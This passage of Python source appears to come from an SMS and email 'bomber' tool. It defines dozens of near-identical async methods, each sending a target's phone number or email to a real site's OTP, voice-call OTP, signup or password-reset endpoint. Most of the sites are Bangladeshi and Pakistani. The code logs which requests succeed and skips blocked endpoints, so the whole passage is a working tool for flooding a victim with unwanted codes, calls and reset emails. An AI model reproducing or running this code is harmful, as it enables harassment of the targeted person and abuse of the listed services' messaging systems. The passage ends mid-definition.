    @smart_api
    async def api_api124___10ms_otp(self):
        api_name = "Api124 - 10Ms Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.10minuteschool.com/v1/auth/send-otp"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API124 - 10MS OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API124 - 10MS OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call12___shikho_call_otp(self):
        api_name = "Call12 - Shikho Call Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.shikho.com/v1/auth/send-otp"
        try:
            async with self.session.post(url, json={"phone": target, "type": "login", "method": "voice"}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL12 - Shikho Call OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL12 - Shikho Call OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_email51___shikho_email_otp(self):
        api_name = "Email51 - Shikho Email Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.shikho.com/v1/auth/send-otp"
        try:
            async with self.session.post(url, json={"email": target, "type": "registration"}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL51 - Shikho Email OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL51 - Shikho Email OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_email52____bikroy_account(self):
        api_name = "Email52 -  Bikroy Account"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://bikroy.com/data/account"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL52 - Bikroy Account", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL52 - Bikroy Account", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email53____bikroy_password_reset(self):
        api_name = "Email53 -  Bikroy Password Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://bikroy.com/data/password_resets"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL53 - Bikroy Password Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL53 - Bikroy Password Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email54____busbud_signup(self):
        api_name = "Email54 -  Busbud Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.busbud.com/auth/email-signup"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL54 - Busbud Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL54 - Busbud Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email55____mithaibd_register(self):
        api_name = "Email55 -  Mithaibd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://mithaibd.com/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL55 - Mithaibd Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL55 - Mithaibd Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email56____sara_lifestyle_otp(self):
        api_name = "Email56 -  Sara Lifestyle Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://prod.saralifestyle.com/api/Master/SendToken"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL56 - Sara Lifestyle OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL56 - Sara Lifestyle OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email57____tohfay_register(self):
        api_name = "Email57 -  Tohfay Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.tohfay.com/user/register.html"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL57 - Tohfay Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL57 - Tohfay Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email58____tohfay_forgot(self):
        api_name = "Email58 -  Tohfay Forgot"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.tohfay.com/forgot-password.html"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL58 - Tohfay Forgot", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL58 - Tohfay Forgot", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email59____mrmedicinemart_signup(self):
        api_name = "Email59 -  Mrmedicinemart Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.mrmedicinemart.com/web/signup"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL59 - MrMedicineMart Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL59 - MrMedicineMart Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email60____mrmedicinemart_reset(self):
        api_name = "Email60 -  Mrmedicinemart Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.mrmedicinemart.com/web/reset_password"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL60 - MrMedicineMart Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL60 - MrMedicineMart Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email61____marhampharmacy_register(self):
        api_name = "Email61 -  Marhampharmacy Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.marhampharmacy.pk/my-account/?action=register"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL61 - MarhamPharmacy Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL61 - MarhamPharmacy Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email62____giftinday_register(self):
        api_name = "Email62 -  Giftinday Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://giftinday.com/my-account/?action=register"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL62 - GiftInDay Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL62 - GiftInDay Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email63____giftinday_password_reset(self):
        api_name = "Email63 -  Giftinday Password Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://giftinday.com/my-account/lost-password/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL63 - GiftInDay Password Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL63 - GiftInDay Password Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email64____sentimentsexpress_register(self):
        api_name = "Email64 -  Sentimentsexpress Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://int.sentimentsexpress.com/account"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL64 - SentimentsExpress Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL64 - SentimentsExpress Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email65____robishop_create(self):
        api_name = "Email65 -  Robishop Create"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.robishop.com.bd/api/user/create"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL65 - RobiShop Create", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL65 - RobiShop Create", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email66____robishop_reset(self):
        api_name = "Email66 -  Robishop Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://api.robishop.com.bd/api/user/reset-password"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL66 - RobiShop Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL66 - RobiShop Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email67____clickbd_signup(self):
        api_name = "Email67 -  Clickbd Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.clickbd.com/login/signup/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL67 - ClickBD Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL67 - ClickBD Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email68____clickbd_recovery(self):
        api_name = "Email68 -  Clickbd Recovery"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.clickbd.com/login/recover/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL68 - ClickBD Recovery", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL68 - ClickBD Recovery", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email69____diamu_register(self):
        api_name = "Email69 -  Diamu Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://diamu.com.bd/my-account/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL69 - Diamu Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL69 - Diamu Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email70____diamu_password_reset(self):
        api_name = "Email70 -  Diamu Password Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://diamu.com.bd/my-account/lost-password/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL70 - Diamu Password Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL70 - Diamu Password Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email71____zymak_register(self):
        api_name = "Email71 -  Zymak Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.zymak.com.bd/my-account/?"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL71 - Zymak Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL71 - Zymak Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email72____zymak_password_reset(self):
        api_name = "Email72 -  Zymak Password Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.zymak.com.bd/my-account/lost-password/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL72 - Zymak Password Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL72 - Zymak Password Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email73____shopz_register(self):
        api_name = "Email73 -  Shopz Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.shopz.com.bd/my-account/?action=register"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL73 - ShopZ Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL73 - ShopZ Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email74____shopz_password_reset(self):
        api_name = "Email74 -  Shopz Password Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.shopz.com.bd/my-account/lost-password/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL74 - ShopZ Password Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL74 - ShopZ Password Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email75____xclusivebrands_register(self):
        api_name = "Email75 -  Xclusivebrands Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://xclusivebrandsbd.com/page-new/admin-ajax.php"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL75 - XclusiveBrands Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL75 - XclusiveBrands Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email76____xclusivebrands_lost_password(self):
        api_name = "Email76 -  Xclusivebrands Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://xclusivebrandsbd.com/page-new/admin-ajax.php"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL76 - XclusiveBrands Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL76 - XclusiveBrands Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email77____bdmanja_register(self):
        api_name = "Email77 -  Bdmanja Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://bdmanja.com/my-account/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL77 - BDManja Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL77 - BDManja Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email78____bdmanja_password_reset(self):
        api_name = "Email78 -  Bdmanja Password Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://bdmanja.com/my-account/lost-password/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL78 - BDManja Password Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL78 - BDManja Password Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email79____xclusivebrands_register_2(self):
        api_name = "Email79 -  Xclusivebrands Register 2"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://xclusivebrandsbd.com/page-new/admin-ajax.php"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL79 - XclusiveBrands Register 2", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL79 - XclusiveBrands Register 2", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email80____xclusivebrands_lost_password_2(self):
        api_name = "Email80 -  Xclusivebrands Lost Password 2"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://xclusivebrandsbd.com/page-new/admin-ajax.php"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL80 - XclusiveBrands Lost Password 2", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL80 - XclusiveBrands Lost Password 2", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email81____gameghor_register(self):
        api_name = "Email81 -  Gameghor Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.gameghor.com/my-account-2/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL81 - GameGhor Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL81 - GameGhor Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email82____gameghor_password_reset(self):
        api_name = "Email82 -  Gameghor Password Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.gameghor.com/my-account-2/lost-password/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL82 - GameGhor Password Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL82 - GameGhor Password Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email83____potakait_register(self):
        api_name = "Email83 -  Potakait Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://potakait.com/account/register"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL83 - PotakaIT Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL83 - PotakaIT Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email84____gamebuybd_register(self):
        api_name = "Email84 -  Gamebuybd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://gamebuybd.com/my-account/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL84 - GameBuyBD Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL84 - GameBuyBD Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email85____gamebuybd_lost_password(self):
        api_name = "Email85 -  Gamebuybd Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://gamebuybd.com/my-account/lost-password/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL85 - GameBuyBD Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL85 - GameBuyBD Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email86____gameforce_register(self):
        api_name = "Email86 -  Gameforce Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://gameforce.pk/my-account/?action=register"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL86 - GameForce Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL86 - GameForce Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email87____gameforce_lost_password(self):
        api_name = "Email87 -  Gameforce Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://gameforce.pk/my-account/lost-password/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL87 - GameForce Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL87 - GameForce Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email88____gamecastlebd_register(self):
        api_name = "Email88 -  Gamecastlebd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://gamecastlebd.com/my-account/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL88 - GameCastleBD Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL88 - GameCastleBD Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email89____gamecastlebd_lost_password(self):
        api_name = "Email89 -  Gamecastlebd Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://gamecastlebd.com/my-account/lost-password/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL89 - GameCastleBD Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL89 - GameCastleBD Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email90____techshopbd_signup(self):
        api_name = "Email90 -  Techshopbd Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://techshopbd.com/sign-in"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL90 - TechShopBD Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL90 - TechShopBD Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email91____electronics_register(self):
        api_name = "Email91 -  Electronics Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.electronics.com.bd/registration"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL91 - Electronics Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL91 - Electronics Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email92____electronics_recovery(self):
        api_name = "Email92 -  Electronics Recovery"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.electronics.com.bd/password-recovery"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL92 - Electronics Recovery", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL92 - Electronics Recovery", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email93____electronics_bangladesh_otp(self):
        api_name = "Email93 -  Electronics Bangladesh Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://storeapi.electronicsbangladesh.com/api/auth/send-otp-for-login"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL93 - Electronics Bangladesh OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL93 - Electronics Bangladesh OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email94____singerbd_otp(self):
        api_name = "Email94 -  Singerbd Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.singerbd.com/api/auth/stp/login"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL94 - SingerBD OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL94 - SingerBD OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email95____robotechbd_register(self):
        api_name = "Email95 -  Robotechbd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.robotechbd.com/my-account/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL95 - RoboTechBD Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL95 - RoboTechBD Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email96____robotechbd_lost_password(self):
        api_name = "Email96 -  Robotechbd Lost Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.robotechbd.com/my-account/lost-password/"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL96 - RoboTechBD Lost Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL96 - RoboTechBD Lost Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email97____electronicshopbd_register(self):
        api_name = "Email97 -  Electronicshopbd Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://electronicshopbd.com/wp-admin/admin-ajax.php"
        try:
            async with self.session.post(url, data={'email': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL97 - ElectronicShopBD Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL97 - ElectronicShopBD Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email98____electronicshopbd_lost_password(self):
